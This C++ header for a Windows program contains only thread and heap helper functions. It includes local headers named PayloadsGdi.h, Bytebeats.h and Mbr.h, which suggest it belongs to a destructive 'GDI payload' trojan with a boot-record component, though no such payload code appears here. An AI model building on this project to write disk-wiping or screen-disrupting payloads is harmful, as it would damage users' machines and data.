typedef struct IUnknown IUnknown;

#pragma once

//  Libs
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "winmm.lib")

//  Pragma warning
#pragma warning(disable : 4996)

//  Includes
#include <Windows.h>
#include <mmsystem.h>
#include <stdlib.h>
#include <string>
#include <math.h>
#include <time.h>
#include "MsgWarn.h"
#include "Bytebeats.h"
#include "PayloadsGdi.h"
#include "System.h"
#include "PolygonsForms.h"
#include "Mbr.h"

HANDLE ThreadExecute(LPTHREAD_START_ROUTINE fFunction, HANDLE* phHeap)
{
    if (phHeap != NULL)
    {
        HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
        LPVOID lpHeapMemory = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8888 * 60);
        *phHeap = hHeap;

        return CreateThread(NULL, NULL, fFunction, lpHeapMemory, NULL, NULL);
    }
    else
    {
        return CreateThread(NULL, NULL, fFunction, NULL, NULL, NULL);
    }
}

VOID ThreadAbort(HANDLE hThread, HANDLE hHeap)
{
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    HeapDestroy(hHeap);
}
